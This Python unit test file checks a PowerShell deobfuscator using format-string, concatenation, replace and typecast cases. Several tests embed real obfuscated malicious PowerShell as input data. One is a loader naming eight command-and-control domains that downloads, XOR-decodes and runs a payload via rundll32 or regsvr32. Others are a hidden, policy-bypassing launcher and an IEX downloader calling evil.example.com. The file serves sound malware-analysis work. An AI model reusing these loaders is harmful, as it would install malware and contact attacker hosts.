from .. import TestUnitBase


class TestPowerShellASTDeobfuscator(TestUnitBase):

    def test_format_string_basic(self):
        data = b'"{0}{2}{1}" -f "signa","ures","t"'
        result = self.load().process(data)
        self.assertIn(b'signatures', result)

    def test_format_string_in_parens(self):
        data = b'("{0}{2}{1}"-f "signa","ures","t")'
        result = self.load().process(data)
        self.assertIn(b'signatures', result)

    def test_format_string_single_quotes(self):
        data = b"('{2}{0}{1}'-f'c','m','g')"
        result = self.load().process(data)
        self.assertIn(b'gcm', result)

    def test_concat_basic(self):
        data = b"'foo' + 'bar'"
        result = self.load().process(data)
        self.assertIn(b'foobar', result)

    def test_concat_double_quotes(self):
        data = b'"hel" + "lo"'
        result = self.load().process(data)
        self.assertIn(b'hello', result)

    def test_bracket_removal_string(self):
        data = b'("hello")'
        result = self.load().process(data)
        self.assertNotIn(b'(', result)
        self.assertIn(b'hello', result)

    def test_bracket_removal_integer(self):
        data = b'(42)'
        result = self.load().process(data)
        self.assertEqual(result.strip(), b'42')

    def test_typecast_char(self):
        data = b'[char]120'
        result = self.load().process(data)
        self.assertIn(b'x', result)

    def test_typecast_char_hex(self):
        data = b'[char]0x41'
        result = self.load().process(data)
        self.assertIn(b'A', result)

    def test_typecast_string_strip(self):
        data = b'[string]"foo"'
        result = self.load().process(data)
        self.assertIn(b'foo', result)
        self.assertNotIn(b'[string]', result)

    def test_typecast_char_array(self):
        data = b'[char[]](72,101,108,108,111)'
        result = self.load().process(data)
        self.assertIn(b'Hello', result)

    def test_string_replace_method(self):
        data = b'"haystack".Replace("hay","needle")'
        result = self.load().process(data)
        self.assertIn(b'needlestack', result)

    def test_string_replace_operator(self):
        data = b'"Hello World" -replace "World","Earth"'
        result = self.load().process(data)
        self.assertIn(b'Hello Earth', result)

    def test_chained_replace_operator(self):
        data = b'"ABCDEF" -replace \'AB\',\'ab\' -replace \'CD\',\'cd\' -replace \'EF\',\'ef\''
        result = self.load().process(data)
        self.assertIn(b'abcdef', result)

    def test_uncurly_variable(self):
        data = b'${variable}'
        result = self.load().process(data)
        self.assertEqual(result.strip(), b'$variable')

    def test_case_normalize_invoke_expression(self):
        data = b"iNVokE-exPreSSion"
        result = self.load().process(data)
        self.assertIn(b'Invoke-Expression', result)

    def test_case_normalize_get_variable(self):
        data = b'gEt-VaRIAblE'
        result = self.load().process(data)
        self.assertIn(b'Get-Variable', result)

    def test_case_normalize_set_variable(self):
        data = b'sEt-VarIAbLE'
        result = self.load().process(data)
        self.assertIn(b'Set-Variable', result)

    def test_invoke_simplification_member(self):
        data = b'$x.ToString.Invoke()'
        result = self.load().process(data)
        self.assertIn(b'$x.ToString()', result)

    def test_invoke_simplification_quoted_member(self):
        data = b'$x."ToString"()'
        result = self.load().process(data)
        self.assertIn(b'$x.ToString()', result)

    def test_command_invocation_ampersand(self):
        data = b'& ("Invoke-Expression")'
        result = self.load().process(data)
        self.assertIn(b'Invoke-Expression', result)
        self.assertNotIn(b'&', result)

    def test_command_invocation_dot(self):
        data = b". ('Set-Variable') foo 42"
        result = self.load().process(data)
        self.assertIn(b'Set-Variable', result)

    def test_b64convert(self):
        data = b'[System.Convert]::FromBase64String("AQID")'
        result = self.load().process(data)
        self.assertIn(b'0x01', result)
        self.assertIn(b'0x02', result)
        self.assertIn(b'0x03', result)

    def test_encoding_utf8(self):
        data = b'[System.Text.Encoding]::UTF8.GetString(@(72, 101, 108, 108, 111))'
        result = self.load().process(data)
        self.assertIn(b'Hello', result)

    def test_gcm_unwrap(self):
        data = b"& (gcm 'Set-Variable') foo 42"
        result = self.load().process(data)
        self.assertIn(b'Set-Variable', result)
        self.assertNotIn(b'gcm', result)

    def test_real_world_01(self):
        data = BR'''&('set-varIAbLE') gHc7R6XtR8aE 16;.('SET-vaRIabLE') PkfYKFVSBTmn 27;.(.    ('{2}{0}{1}'-f'c','m','g')    ('{4}{2}{3}{0}{5}{6}{7}{8}{6}{9}{1}{2}'-f'-','l','e','t','s','v','a','r','i','b')) EUCsMplIyR03 43;&(&('{0}{1}{2}'-f'g','c','m')"seT-VARiaBLe") F8riv8rRCqrK((((&"get-vARiaBle" gHc7R6XtR8aE).('vaLUE')+29)-AS[chaR]).('tOsTrinG').iNVoke()+(((."GeT-VaRIAblE" PkfYKFVSBTmn).('{4}{2}{0}{1}{3}'-f'l','u','a','e','v')+74)-as[CHAR]).('tosTrInG').INVOke()+(((&"gEt-VarIabLe" EUCsMplIyR03)."VaLUE"+56)-as[cHAr]).('{4}{2}{5}{4}{3}{1}{0}{6}'-f'n','i','o','r','t','s','g').INvOke());PowERsHELL -NONiNtErac -nOLOgo -NOP -Windows HIDDEn -ExEC BYpasS (    .('{7}{4}{9}{0}{2}{3}{1}{6}{3}{5}{8}{4}'-f'-','r','v','a','e','b','i','g','l','t') F8riv8rRCqrK).('{4}{3}{1}{0}{2}'-f'u','l','e','a','v')    .('{5}{2}{6}{5}{4}{0}{1}{3}'-f'i','n','o','g','r','t','s').iNvokE()'''
        result = self.load().process(data)
        self.assertTrue(
            result.count(b'Set-Variable') == 4
        )

    def test_format_string_evaluation(self):
        data = (
            b'''(  ITeM  VarIAbLe:2OF09b  ).VaLue::"dEFauLtneTwORkcrEdEnTiALs"'''
            b''';.("{1}{0}"-f'wr','i')'''
            b'''("{4}{0}{8}{2}{3}{1}{5}{6}{7}"-f'/',':443','.','.com','http:/','/','download/p','owershell/','example')'''
        )
        deob = self.load()
        result = data | deob | str
        self.assertIn('example..com', result)

    def test_string_replace_chain(self):
        data = (
            b"'hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm'"
            b".Replace('fTdH8C6','ttps://')"
            b".Replace('s97YMGcyg0WCr','o')"
            b".Replace('z2Wr6qQR', 'e')"
        )
        result = self.load().process(data)
        self.assertIn(b'https://evil.example.com/boom', result)

    def test_real_world_02(self):
        data = BR'''sEt-iTEM ('v'+'aria'+'bLE:'+'s2P4'+'O')  (  [Type]("{1}{0}" -F'vERt','CON')  ); Set-ITeM  ('varIablE'+':'+'t51') ([type]("{7}{1}{0}{3}{6}{5}{4}{2}"-F 'omPReSsion.cOMP','O.C','E','rE','oNmOd','SI','s','i')  )  ;seT-VARiaBlE  ("t"+"u49Q") ( [type]("{2}{3}{4}{0}{1}{5}" -f'c','EpoIn','NeT.S','e','RvI','tmanAgeR')  );   SET  ("{1}{0}" -f'vYp','7')  (  [TyPE]("{0}{6}{4}{1}{7}{5}{3}{2}" -f 'NET.se','yP','PE','y','uriT','Olt','C','rOtoC')  )  ; SET ('CUw'+'3')  ([TYpE]("{5}{2}{7}{3}{0}{1}{4}{6}" -f 'pOi','N','YSTeM','ervIcE','Tm','s','aNAGER','.Net.S') ) ; ${b`x1`4N}  =  [tYPE]("{1}{2}{0}" -F'T','Net.We','breqUeS')  ; ${Yn4U`15} =  [tYpE]("{3}{2}{0}{1}"-F'ch','E','nTiAlcA','neT.CrEDE')  ;SET-iteM  ("{3}{0}{1}{2}" -f 'bLe:','TQ','4pIV','VARia') (  [tyPE]("{0}{2}{4}{1}{3}" -f 'Te','d','Xt','INg','.EncO') );sv ("{1}{0}" -f'9PUc','Xt') ([tYPE]("{2}{1}{0}"-f 'E','Il','Io.f')  ) ; ${rU`o3}= [TypE]("{2}{0}{1}"-F 'V','AtoR','aCti') ;  SeT-itEM  ('VariA'+'bl'+'E:Ipjn')  ([type]("{0}{1}"-f 'TY','PE') ); ${r`o}=("{1}{2}{0}" -f'.1','127','.0.0');${r`EU} = P`ING ${r`O};if (${R`eU} -match ("{1}{0}"-f 'evut','ic')){${Ks}=ge`T`-RaNdOm -Max 11;function tR`iomE(${T`e}){${I`i}= (gi ('V'+'AriA'+'BlE:'+'s2p4'+'O')  ).vaLue::("{2}{1}{0}{3}" -f'se','mBa','Fro','64String').Invoke(${te});return ${ii}};function aS(${S`A}){-join((${s`A}."le`N`gTh"-1)..0|foreacH-`oB`J`EcT{${sA}[${_}]})};${b`Iz}=$(g`ET-`wmIoBj`eCT ("{1}{5}{2}{6}{3}{4}{0}"-f't','Win32','mp','stemProd','uc','_Co','uterSy') -computername ('.') | S`eL`ECt-`ObjEct -ExpandProperty ("{0}{1}" -f 'U','UID'));function NI`Ll(${T`yo}){${kj}=nE`w`-`oBJeCt ("{3}{0}{2}{1}"-f'O.Mem','tream','oryS','I')(,${T`yo});${m`m}=(NEW`-o`BJEct ("{0}{3}{2}{4}{1}"-f'IO.','r','mRead','Strea','e')(N`EW-`OBJ`eCt ("{2}{0}{3}{4}{1}{5}{6}"-f 'mpr','pStr','IO.Co','ession.Gz','i','ea','m')(${Kj}, ( gEt-varIablE  ("t5"+"1")).vAlUE::"D`e`COMPRESs"))).("{1}{2}{0}" -f 'ToEnd','R','ead').Invoke();return ${m`m}};function t{${Z}=@(("{1}{2}{3}{0}"-f 'm','mictosof','ts','.co'),("{2}{1}{0}{3}{4}"-f'rs.','e','qartabe','c','om'),("{5}{1}{4}{2}{0}{3}"-f 'iadelleentrat','g','z','e.site','en','a'),("{1}{2}{3}{0}"-f 'm','teslao','ilcar','.co'),("{0}{1}{4}{2}{3}"-f 'h','o','.','com','likokooo'),("{1}{0}{2}{3}{4}"-f'l','ub','a','znze.','online'),("{3}{2}{1}{0}"-f'icu','.','ak','hiteron'),("{1}{2}{0}" -f'te','ab','rakam.si'));${z}=${Z}|s`oRT-`obJE`Ct {GeT`-raND`om};Foreach(${T} in ${Z}){if(.("{1}{2}{4}{3}{0}"-f 'n','T','est-Co','ectio','nn') (${t}) -Count 1 -quiet){${Rr}=${T};}};return ''+'ht'+'tp'+("{1}{0}" -f '://','s')+${r`R}+'/'+''};function O`sI{${rY}=&('T');${m}=${R`Y}+'?'+${B`Iz};  (  Ls ('V'+'ARIabl'+'E:'+'Tu'+'49Q')).VAlUe::"Se`cUR`i`TyP`RoTO`COL"= (  GEt-vaRiABle  ("{0}{1}" -f '7v','YP') -Value)::"T`Ls"; (  get-cHildiTem  ('vArIaB'+'Le'+':cuW'+'3')  ).VaLUe::"s`eR`VerceRtI`FI`c`A`TEVAliDat`iOnCAllb`ACK"={${T`Rue}};${a}=&("{2}{1}{0}" -f 't','objec','new-') ("{2}{1}{0}" -f 'nt','ie','net.webcl');${A}."Pro`Xy"= (  vaRIABLe ('B'+'X14n') ).valUe::("{2}{3}{1}{0}{4}" -f 'eb','temW','G','etSys','Proxy').Invoke();${a}."pRO`xY"."crEDenTi`A`lS"= (  get-cHildITem ("{0}{1}{3}{2}{4}"-f'Var','i','bLE:Y','a','N4U15')).vaLue::"DeFAul`T`crED`eN`TiaLs";return &("{0}{1}"-f 'N','iLL')(${A}.("{2}{1}{3}{0}"-f 'a','nloadD','dow','at').Invoke(${m}))};.("{0}{1}"-f's','al') ("{0}{1}"-f'ra','ndomG') ("{1}{2}{0}" -f'l32','run','dl');function K`eLv{${FD}=&("{1}{0}" -f 'i','os');${U}=${Fd}.("{2}{0}{1}"-f 'ubst','ring','s').Invoke(0,1);${E`F}=${f`d}.("{1}{0}"-f 'move','re').Invoke(0,1);${o`o}=${EF} -split'!';${Vr}=  (  VaRIABLE  ("{1}{2}{0}"-f 'Piv','Tq','4')).VaLUE::"UT`F8";foreach(${O} in ${O`o}[0]){${o`UT}=@();${O`A}=${U}.("{2}{1}{0}"-f'ay','arArr','ToCh').Invoke();${O}=.("{0}{1}"-f 'T','riome')(${o});for(${i}=0; ${I} -lt ${o}."cOU`NT"; ${I}++){${O`UT} += [char]([Byte]${O}[${I}] -bxor[Byte]${oA}[${i}%${O`A}."C`OUnT"])}};${sS}=${e`F}."r`E`plAcE"((${Oo}[0]+"!"),${V`R}."gE`TstrI`Ng"(${O`UT}));return ${s`S}};${a`ZQ}=${eN`V:t`eMP};${f`BF}=(${D}=.("{0}{1}" -f 'g','ci') ${a`Zq}|&("{0}{1}{2}" -f'g','et-rand','om'))."nA`me" -replace ".{5}$";${H`B}=${a`Zq}+'\'+${F`Bf}+'.';function Cal`CC{${K`I}=.("{0}{1}" -f'kel','v');  ( gEt-vAriABlE  ("{0}{1}" -f 'xt9','Puc')  ).VALuE::("{2}{1}{0}" -f 'tes','llBy','WriteA').Invoke(${h`B},(&("{0}{2}{1}" -f 'T','e','riom')(${k`i} -replace ".{200}$")));if((&("{0}{1}"-f 'g','ci') ${H`B})."l`En`GtH" -lt 256){exit};${iz}=.('as')(("{2}{0}{1}{3}"-f 'evr','eSret','r','sigeRllD'));if (${ks} %2 -eq 0){&("{0}{1}" -f'ran','domG') ${hB} ${i`z};&("{0}{1}"-f'slee','p') 35;}else{${m`J}= (vARIAblE  ('rUO'+'3')  -vALueONlY)::"CrEatEi`NSTa`NCE"( ${I`pjn}::("{2}{0}{1}{3}"-f'ypefrom','cl','gett','sid').Invoke("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));${Mj}."Doc`U`MeNt"."app`LI`CaT`iON"."Pa`REnT".("{1}{0}{2}"-f'hel','s','lexecute').Invoke(("{0}{1}"-f'r','undll32'),(' '+"$Hb "+"$iZ"),("{3}{1}{0}{2}{4}" -f'ndowsSy','Wi','stem','C:','32'),${n`ULL},0);&("{1}{0}" -f 'leep','s') 35};.('sl');.("{2}{1}{0}"-f'svr32','eg','r') ('/s') ${h`B} > ${Hb}};&("{0}{1}"-f 'Ca','lcc')}else{exit}'''
        result = self.load().process(data)
        for c2server in [
            b'mictosofts.com',
            b'qartabeers.com',
            b'agenziadelleentrate.site',
            b'teslaoilcar.com',
            b'holikokooo.com',
            b'ublaznze.online',
            b'hiteronak.icu',
            b'abrakam.site'
        ]:
            self.assertIn(c2server, result)

    def test_real_world_03(self):
        data = BR'''$v='i'+''+'E'+'x';sal foo $v;$pzhhqdwl=foo(foo($($('(nQNVrd3W2GjJK36w-objQNVrd3W2GjJK36ct SystQNVrd3W2GjJK36m.NQNVrd3W2GjJK36t.WQNVrd3W2GjJK36bCliQNVrd3W2GjJK36nt).Dos2Wr6qQRtring(''hfTdH8C6z2Wr6qQRvil.z2Wr6qQRxamplz2Wr6qQR.cs97YMGcyg0WCrm/bs97YMGcyg0WCrs97YMGcyg0WCrm''.Replace(''fTdH8C6'',''ttps://'').Replace(''s97YMGcyg0WCr'',''o'').Replace(''z2Wr6qQR'', ''e''))').Replace('QNVrd3W2GjJK36', 'e').Replace('s2Wr6qQR', 'wnloadS'))))'''
        deob = self.load()
        extract = self.ldu('carve', 'ps1str', single=True, decode=True)
        self.assertIn(b'https://evil.example.com/boom',
            data | deob | extract | deob | bytes)


class TestPS1BracketRemoval(TestUnitBase):

    def test_string_literal_01(self):
        result = self.load().process(B'("{0}{2}{1}")')
        self.assertIn(b'"{0}{2}{1}"', result)

    def test_string_literal_02(self):
        result = self.load().process(B'( ((    \n( "Test")))')
        self.assertIn(b'"Test"', result)

    def test_string_literal_03(self):
        result = self.load().process(B'(((\n( "Tes""t")\n)) )')
        self.assertIn(b'"Tes""t"', result)

    def test_numeric_literal_01(self):
        result = self.load().process(B'(0x12)')
        self.assertIn(b'0x12', result)

    def test_numeric_literal_02(self):
        result = self.load().process(B'( ((    \n( 0x12)  ))')
        self.assertIn(b'0x12', result)

    def test_numeric_literal_03(self):
        result = self.load().process(B'((31337) )')
        self.assertIn(b'31337', result)


class TestPS1Concat(TestUnitBase):

    def test_uneven(self):
        result = self.load().process(b"'T'+'b'+'c'")
        self.assertIn(b'Tbc', result)

    def test_concatenation(self):
        result = self.load().process(b'"bla" + "foo" +"bar"')
        self.assertIn(b'blafoobar', result)

    def test_uneven_special_chars(self):
        result = self.load().process(b'$t = "bla " + "\\foo" + "bar baz"')
        self.assertIn(b'bla \\foobar baz', result)

    def test_not_inside_string(self):
        data = b'''$t="'bla ' + '\\foo'"; $t = $t + 'bar' + "baz"'''
        result = self.load().process(data)
        self.assertIn(b"'bla ' + '\\foo'", result)
        self.assertIn(b'barbaz', result)

    def test_real_world_01(self):
        data = b'''-RepLaCe"UVL",""""-CrePLAcE "MQo","``" -RepLaCe ("0"+"N"+"R"),"'"-CrePLAcE'eV5',"`$"-CrePLAcE  '31V',"|")'''
        result = self.load().process(data)
        self.assertIn(b'0NR', result)

    def test_variable_substitution(self):
        data = B'''$y = "$y"+'$z';'''
        result = self.load().deobfuscate(data.decode())
        self.assertIn('$z', result)


class TestPS1FormatString(TestUnitBase):

    def test_split_format_string(self):
        result = self.load().process(BR'''"{0}$SEP{1}"-f 'Hello',"World"''')
        self.assertIn(b'Hello', result)
        self.assertIn(b'World', result)

    def test_invalid_format(self):
        data = BR'''"{0}{2}{1}"-f 'Hello',"World"'''
        result = self.load().process(data)
        self.assertIn(b'Hello', result)

    def test_all_single_quotes(self):
        result = self.load().process(BR"""'{0}{2}{1}'-f 'signa','ures','t'""")
        self.assertIn(b'signatures', result)

    def test_mixed_quotes(self):
        result = self.load().process(BR'''"{0}{2}{1}"-f 'signa','ures',"t"''')
        self.assertIn(b'signatures', result)

    def test_format_string_with_chars(self):
        result = self.load().process(b'("{0}na{2}{1}"-f \'sig\',\'ures\',\'t\')')
        self.assertIn(b'signatures', result)

    def test_multiple_occurrences(self):
        result = self.load().process(
            b'"{10}{1}{0}{5}{9}{7}{8}{7}{3}{6}{2}{7}{4}{4}{10}{5}{1}"'
            b"-f'v','n','r','x','s','o','p','e','-','k','i'"
        )
        self.assertIn(b'invoke-expression', result)


class TestPS1StringReplace(TestUnitBase):

    def test_trivial(self):
        result = self.load().deobfuscate('''"Hello World".replace('l', "FOO")''')
        self.assertIn('HeFOOFOOo WorFOOd', result)

    def test_real_world_01(self):
        data = B'''"UVL0NR"-RepLaCe"UVL",""""-RepLaCe "0NR","'"-CrePLAcE  '31V',"|"))'''
        result = self.load().process(data)
        self.assertIn(b"'", result)

    def test_variable_substitution_01(self):
        data = '''Write-Output "The $product costs `$100 for the average person." -replace '$', "\u20ac";'''.encode('utf8')
        result = self.load().process(data)
        self.assertIn('\u20ac'.encode('utf8'), result)

    def test_variable_substitution_02(self):
        data = '''Write-Output "The $product costs `$100 for the average person." -replace '$', "$currency";'''.encode('utf8')
        result = self.load().process(data)
        self.assertIn(b'currency', result)


class TestPS1Typecast(TestUnitBase):

    def test_useless_string_cast(self):
        result = self.load().deobfuscate('''.replAce(("M0I"),[strIng]"'")''')
        self.assertIn("'", result)
        self.assertNotIn('[strIng]', result)
